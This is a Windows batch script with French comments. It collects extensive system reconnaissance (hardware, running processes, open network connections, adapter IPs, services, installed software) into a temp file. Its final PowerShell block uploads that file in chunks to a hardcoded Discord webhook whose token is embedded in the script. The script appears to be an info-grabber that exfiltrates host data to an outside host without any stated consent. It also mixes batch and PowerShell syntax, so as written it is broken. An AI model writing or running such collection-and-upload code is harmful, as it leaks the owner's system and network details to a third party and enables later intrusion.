@echo off

(
    echo ==================================
    echo INFORMATIONS SYSTÈME
    echo ==================================

    echo --- Informations CPU ---
    powershell "Get-WmiObject -Class Win32_Processor | Format-Table Name, NumberOfCores, NumberOfLogicalProcessors, LoadPercentage, MaxClockSpeed -AutoSize"

    echo ----------------------------------
    echo --- Mémoire RAM et utilisation ---
    powershell "Get-WmiObject -Class Win32_OperatingSystem | Format-Table TotalVisibleMemorySize, FreePhysicalMemory, TotalVirtualMemorySize, FreeVirtualMemory -AutoSize"

    echo ----------------------------------
    echo --- Utilisation disque ---
    wmic logicaldisk get caption, freespace, size, filesystem, VolumeSerialNumber

    echo ==================================
    echo PROCESSUS EN COURS
    echo ==================================

    echo --- Top des processus par utilisation CPU ---
    tasklist

    echo ==================================
    echo UTILISATION DU RÉSEAU
    echo ==================================

    echo --- Connexions réseau actuelles ---
    netstat -ano

    echo ----------------------------------
    echo --- Statistiques réseau ---
    netstat -e

    echo ----------------------------------
    echo --- Informations sur le système d'exploitation ---
    powershell "Get-WmiObject -Class Win32_OperatingSystem | Format-Table Caption, Manufacturer, OSArchitecture, LastBootUpTime -AutoSize"

    echo ----------------------------------
    echo --- Informations sur la carte graphique ---
    powershell "Get-WmiObject -Class Win32_VideoController | Format-Table Name, DriverVersion, VideoProcessor -AutoSize"

    echo ----------------------------------
    echo --- État de la mémoire et de l'espace disque ---
    powershell "Get-WmiObject -Class Win32_LogicalDisk | Format-Table DeviceID, @{Name='Size(GB)';Expression={"{0:N2}" -f ($_.Size/1GB)}}, @{Name='FreeSpace(GB)';Expression={"{0:N2}" -f ($_.FreeSpace/1GB)}} -AutoSize"

    echo ----------------------------------
    echo --- Informations sur le réseau ---
    powershell "Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Format-Table Description, IPAddress, IPSubnet, DefaultIPGateway -AutoSize"

    echo ----------------------------------
    echo --- Services Windows ---
    powershell "Get-Service | Where-Object { $_.Status -eq 'Running' } | Format-Table Name, DisplayName, Status -AutoSize"

    echo ----------------------------------
    echo --- Santé et performances du système ---
    powershell "Get-WmiObject -Class Win32_ComputerSystem | Format-Table Model, TotalPhysicalMemory, NumberOfProcessors, NumberOfLogicalProcessors -AutoSize"

    echo ----------------------------------
    echo --- Processus les plus gourmands en ressources ---
    powershell "Get-Process | Sort-Object -Descending CPU | Select-Object -First 10 | Format-Table Name, CPU, WorkingSet -AutoSize"

    echo ----------------------------------
    echo --- Liste des logiciels installés ---
    powershell "Get-WmiObject -Class Win32_Product | Format-Table Name, Version -AutoSize"

    echo "----------------------------------"
    echo "Fin du script."
) > "%temp%\system_info.txt"

:: Envoi du fichier au webhook Discord
# Lire le contenu du fichier
$content = Get-Content -Raw "$env:temp\system_info.txt"

# Diviser le contenu en morceaux de 2000 caractères
$chunks = [System.Collections.Generic.List[object]]@()
$chunkSize = 2000
for ($i = 0; $i -lt $content.Length; $i += $chunkSize) {
    $chunks.Add($content.Substring($i, [Math]::Min($chunkSize, $content.Length - $i)))
}

# Webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF'

# Envoyer chaque morceau séparément
foreach ($chunk in $chunks) {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content = $chunk}
}

